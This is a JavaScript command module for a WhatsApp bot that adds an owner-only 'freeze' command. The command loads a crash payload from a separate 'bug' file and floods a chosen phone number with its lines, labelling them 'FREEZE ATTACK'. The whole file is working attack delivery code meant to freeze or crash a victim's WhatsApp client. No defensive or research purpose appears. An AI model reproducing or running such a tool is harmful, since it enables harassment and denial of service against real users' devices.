const { cmd } = require('../command');
const config = require('../config');
const freezePayload = require('../../bug/izuka5.js'); // Use izuka5.js as requested

cmd({
  pattern: 'freeze',
  desc: 'Owner only command to send freeze attack messages',
  category: 'bug',
  react: '❄️',
  filename: __filename
}, async (bot, mek, m, { from, reply }) => {
  try {
    const prefix = config.PREFIX;
    const botNumber = await bot.decodeJid(bot.user.id);
    const senderId = m.sender;
    const allowedUsers = [botNumber, config.OWNER_NUMBER + '@s.whatsapp.net', ...(config.SUDO || []).map(n => n + '@s.whatsapp.net')];
    const protectedNumbers = ['13058962443']; // Protected numbers

    const body = m.body || '';
    const cmdName = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
    if (cmdName !== 'freeze') return;

    if (!allowedUsers.includes(senderId)) {
      return await bot.sendMessage(from, { text: '*🚫 This command is for owner only.*' }, { quoted: mek });
    }

    const args = body.trim().split(/\s+/).slice(1);
    let targetNumber;

    if (m.isGroup) {
      // If command used inside a group, target the sender
      targetNumber = senderId.split('@')[0];
    } else if (args.length > 0 && !isNaN(args[0])) {
      targetNumber = args[0];
    }

    if (!targetNumber) {
      return await bot.sendMessage(from, {
        text: `❌ Usage:\n${prefix}freeze <number>\nOr use in group to target sender.`
      }, { quoted: mek });
    }

    if (protectedNumbers.includes(targetNumber)) {
      return await bot.sendMessage(from, {
        text: '🛡️ This number is protected and cannot be targeted.'
      }, { quoted: mek });
    }

    const targetJid = `${targetNumber}@s.whatsapp.net`;

    await bot.sendMessage(from, {
      text: `❄️ Launching FREEZE attack on +${targetNumber}... Please wait...`
    }, { quoted: mek });

    const lines = freezePayload.split('\n').filter(Boolean);

    for (let i = 0; i < lines.length; i++) {
      await bot.sendMessage(targetJid, {
        text: `☃️ FREEZE ATTACK #${i + 1}\n${lines[i]}\n\n_⚠️ SYSTEM FREEZE INITIATED_\n~INCONNU XD V2~`
      });
      await new Promise(resolve => setTimeout(resolve, 250));
    }

    await bot.sendMessage(from, {
      text: `✅ FREEZE attack successfully completed on +${targetNumber}.`
    }, { quoted: mek });

  } catch (error) {
    console.error(error);
    reply(`❌ Error: ${error.message}`);
  }
});
